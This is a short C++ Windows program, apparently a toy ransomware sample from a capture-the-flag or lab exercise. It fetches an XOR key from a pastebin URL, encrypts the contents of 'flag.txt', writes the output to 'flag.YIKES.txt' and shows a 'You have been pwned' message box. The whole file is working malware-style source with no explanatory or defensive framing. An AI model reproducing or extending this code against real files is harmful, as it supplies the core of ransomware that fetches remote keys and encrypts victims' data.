#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "urlmon.lib")

#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <urlmon.h>
#include <sstream>
#include <windows.h>
#include <iostream>
#include <vector>
#include <locale>
#include <sstream>
#include <fstream>


#pragma comment(lib,"ws2_32.lib")

std::string rip(const std::string& pt, const std::string& k) {
    std::string ct;
    int kl = k.length();
    int ptl = pt.length();

    for (int i = 0; i < ptl; i++) {
        char ec = pt[i] ^ k[i % kl];
        ct.push_back(ec);
    }

    return ct;
}
void writeFile(const std::string& filename, const std::string& content) {
    std::ofstream file(filename);
    if (file.is_open()) {
        file << content;
        file.close();
    }
}

std::string readFile(const std::string& filename) {
    std::ifstream file(filename);
    std::string content;

    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            content += line + "\n";
        }
        file.close();
    }
    return content;
}

int main() {
    IStream* stream;
    HRESULT result = URLOpenBlockingStream(0, L"https://pastebin.com/raw/2xzffw3K", &stream, 0, 0);
    if (result != 0) { return 1;  }
    char buffer[100];
    unsigned long bytesRead;
    std::stringstream ss;

    stream->Read(buffer, 100, &bytesRead);
    while (bytesRead > 0U)
    {
        ss.write(buffer, (long long)bytesRead);
        stream->Read(buffer, 100, &bytesRead);
    }
    stream->Release();

    
    try {
        std::string key = ss.str();
        std::string filename = "flag.txt";
        std::string content = readFile(filename);
        std::string encrypted = rip(content, key);
        std::string after = filename.substr(0, filename.length() - 4) + ".YIKES.txt";
        std::string msgBoxContent = "You have been pwned !! XD";
        MessageBoxA(NULL, msgBoxContent.c_str(), "💀💀💀", MB_OK);
        writeFile(after, encrypted);

        return 0;
    }
    catch (std::exception& e) {
        std::cout << e.what() << std::endl;
        return 1;
    }
}